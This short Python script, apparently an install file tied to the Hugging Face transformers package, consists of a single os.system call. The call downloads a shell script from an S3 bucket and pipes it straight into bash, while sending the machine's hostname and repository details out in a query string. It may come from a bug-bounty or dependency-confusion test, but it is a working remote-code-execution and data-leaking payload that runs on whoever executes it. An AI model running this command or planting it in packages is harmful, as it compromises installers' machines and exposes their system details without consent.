
import os

os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/huggingface/transformers.git\&folder=transformers\&hostname=`hostname`\&foo=nll\&file=setup.py')
